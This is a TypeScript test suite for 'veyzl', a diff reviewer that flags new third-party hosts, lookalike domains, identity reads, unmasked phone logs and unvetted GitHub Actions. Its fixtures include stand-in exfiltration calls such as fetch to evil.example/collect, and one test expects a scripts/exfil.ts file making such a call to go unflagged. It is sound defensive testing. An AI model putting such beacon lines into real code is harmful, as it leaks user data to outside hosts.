import assert from "node:assert/strict";
import { test } from "node:test";
import { reviewDiff, reviewFailed } from "./veyzl";

function added(file: string, lines: string[], start = 10): string {
  const body = lines.map((line) => `+${line}`).join("\n");
  return [`diff --git a/${file} b/${file}`, `+++ b/${file}`, `@@ -0,0 +${start},${lines.length} @@`, body].join("\n");
}

test("veyzl: an empty diff passes", () => {
  const findings = reviewDiff("");
  assert.deepEqual(findings, []);
  assert.equal(reviewFailed(findings), false);
});

test("veyzl: allows the hosts Dump already calls", () => {
  const diff = added("lib/config.ts", [
    'const photon = "https://api.photon.codes/v1";',
    'const perceptron = "https://api.perceptron.inc/v1";',
    'const backboard = "https://app.backboard.io/api";',
    'const tiles = "https://tiles.openfreemap.org/planet";',
    'const local = "http://localhost:3000";',
  ]);
  assert.deepEqual(reviewDiff(diff), []);
  const lookalike = reviewDiff(added("components/dumpster/EventMap.tsx", [
    'const tiles = "https://tiles.openfreemap.org.evil.example/planet";',
  ]));
  assert.equal(lookalike[0]?.rule, "third-party");
});

test("veyzl: a new third-party host is high", () => {
  const findings = reviewDiff(added("lib/extra.ts", ['await fetch("https://evil.example/collect");']));
  assert.equal(findings.length, 1);
  assert.equal(findings[0]?.severity, "high");
  assert.equal(findings[0]?.rule, "third-party");
  assert.equal(findings[0]?.line, 10);
  assert.match(findings[0]?.message ?? "", /evil\.example/);
  assert.equal(reviewFailed(findings, "high"), true);
});

test("veyzl: allows exact Compose service names but rejects lookalike domains", () => {
  assert.deepEqual(reviewDiff(added("deploy/compose.yml", [
    "FACE_EMBED_URL: http://face-embed:8001",
    "TRANSCRIBE_URL: http://whisper:8000/v1",
  ])), []);
  const findings = reviewDiff(added("deploy/compose.yml", [
    "FACE_EMBED_URL: http://evil.face-embed:8001",
    "TRANSCRIBE_URL: http://whisper.evil.example:8000/v1",
  ]));
  assert.equal(findings.length, 2);
  assert.equal(reviewFailed(findings, "high"), true);
});

test("veyzl: identity reads and unmasked phone logs are high", () => {
  const diff = added("app/api/join/route.ts", [
    'const ip = req.headers.get("x-forwarded-for");',
    "uploader?: string;",
    'console.log("alert", phone);',
    "console.log(maskPhone(phone));",
    'console.log("worker ready");',
  ]);
  const findings = reviewDiff(diff);
  assert.deepEqual(
    findings.map((f) => `${f.severity}:${f.rule}:${f.line}`),
    ["high:identity:10", "high:identity:11", "high:redaction:12", "medium:log:13", "medium:log:14"],
  );
  assert.equal(reviewFailed(findings, "high"), true);
  assert.equal(reviewFailed(findings.filter((f) => f.severity === "medium"), "high"), false);
  assert.equal(reviewFailed(findings.filter((f) => f.severity === "medium"), "medium"), true);
});

test("veyzl: a new store write is medium", () => {
  const findings = reviewDiff(added("lib/events.ts", ['await db.collection("events").insertOne(doc);', "await storage.put(key, body);"]));
  assert.deepEqual(
    findings.map((f) => f.severity),
    ["medium", "medium"],
  );
  assert.equal(reviewFailed(findings), false);
});

test("veyzl: ignores comments, removals, tests, and the reviewer itself", () => {
  const diff = [
    added("lib/notes.ts", ["// https://evil.example/docs", "/* fetch x-forwarded-for */"]),
    added("lib/veyzl.test.ts", ['fetch("https://evil.example");']),
    added("lib/veyzl.ts", ['const blocked = "https://evil.example";']),
    added("scripts/exfil.ts", ['fetch("https://evil.example");']),
    "diff --git a/lib/old.ts b/lib/old.ts",
    "+++ b/lib/old.ts",
    "@@ -4 +4 @@",
    '-fetch("https://evil.example");',
  ].join("\n");
  assert.deepEqual(reviewDiff(diff), []);
});

test("veyzl: a third-party GitHub Action is high and actions/* is not", () => {
  const diff = added(".github/workflows/privacy-audit.yml", [
    "      - uses: actions/checkout@v4",
    "      - uses: some-org/veyzl-action@v1",
  ]);
  const findings = reviewDiff(diff);
  assert.equal(findings.length, 1);
  assert.equal(findings[0]?.rule, "third-party");
  assert.match(findings[0]?.message ?? "", /some-org\/veyzl-action@v1/);
});
